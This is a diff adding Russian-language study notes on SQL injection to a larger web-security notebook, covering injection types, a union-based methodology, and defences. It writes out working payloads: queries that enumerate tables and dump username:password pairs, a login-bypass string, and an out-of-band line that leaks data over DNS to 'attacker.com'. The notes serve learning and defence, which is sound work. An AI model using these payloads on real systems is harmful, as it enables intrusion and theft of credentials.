@@ -1056,3 +1056,48 @@ Decoder, Comparer, Sequencer и Organizer — вспомогательные м�
 API для разработчиков
 - Вкладка Extensions → API показывает все доступные конечные точки для создания расширений.
 - Подробнее в официальной документации PortSwigger.
+
+## Уязвимости Веб-приложений 1 (Web Application Vulnerabilities 1)
+### Введение в SQL-инъекции (SQL Injection Introduction)
+Что это
+Уязвимость, при которой пользовательский ввод встраивается в SQL-запрос без надлежащей обработки, позволяя злоумышленнику изменить логику запроса.
+Типы SQLi
+- **In-Band**: результат виден на странице.
+  - Error-Based: через ошибки БД.
+  - Union-Based: через UNION SELECT.
+- **Blind**: результат не виден.
+  - Boolean-Based: разница true/false.
+  - Time-Based: задержка через SLEEP().
+- **Out-of-Band**: данные уходят через DNS/HTTP-запросы.
+
+Основные приёмы
+- **Комментарии**: `--`, `#`, `/* */` (обрезка лишнего синтаксиса).
+- **UNION**: объединяет два SELECT; требует одинаковое число столбцов.
+- **LIKE**: сопоставление с образцом; `%` любая последовательность, `_` один символ.
+- **group_concat()**: объединяет несколько строк в одну.
+- **information_schema**: системная БД, хранит имена таблиц и столбцов.
+
+Методология Union-Based
+1. Определить число столбцов: `1 UNION SELECT 1,2,...`
+2. Сделать вывод видимым: `0 UNION SELECT 1,2,3`
+3. Имя БД: `0 UNION SELECT 1,2,database()`
+4. Таблицы: `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='db'`
+5. Столбцы: `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='table'`
+6. Данные: `0 UNION SELECT 1,2,group_concat(username,':',password) FROM table`
+Обход аутентификации
+`' OR 1=1;--` в поле логина делает WHERE всегда истинным и комментирует проверку пароля.
+
+Boolean Blind
+Используем `LIKE 'a%'` и наблюдаем true/false, перебирая посимвольно.
+
+Time-Based Blind
+Используем `SLEEP(5)` в UNION, задержка = true.
+
+Out-of-Band (кратко)
+`LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'))` — данные уходят в DNS-запрос.
+
+Защита
+- Prepared Statements (главное).
+- Валидация по whitelist.
+- Принцип наименьших привилегий.
+- WAF как дополнительный слой.
